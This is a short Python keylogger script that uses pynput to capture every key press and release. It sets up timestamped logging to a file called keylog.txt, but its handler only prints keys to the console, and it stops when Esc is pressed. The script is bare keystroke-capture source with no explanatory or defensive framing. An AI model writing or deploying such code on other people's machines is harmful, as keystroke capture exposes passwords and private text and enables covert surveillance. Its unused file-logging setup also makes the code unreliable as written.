import logging
from pynput  import keyboard as pynput_keyboard
logging.basicConfig(filename="keylog.txt", level=logging.INFO, format="%(asctime)s - %(message)s")

def on_press(key):
    """Handles key press events."""
    try:
      # Log regular keys (e.g., 'a', 'b', 'c')
        print(f"Key pressed: {key.char}")
    except AttributeError:
        # Log special keys (e.g., 'space', 'enter', 'shift')
        print(f"Special key pressed: {key}")

def on_release(key):
    if key == pynput_keyboard.Key.esc:
        return False  # para o listener
with pynput_keyboard.Listener(
    on_press=on_press,
    on_release=on_release
) as listener:
    listener.join()


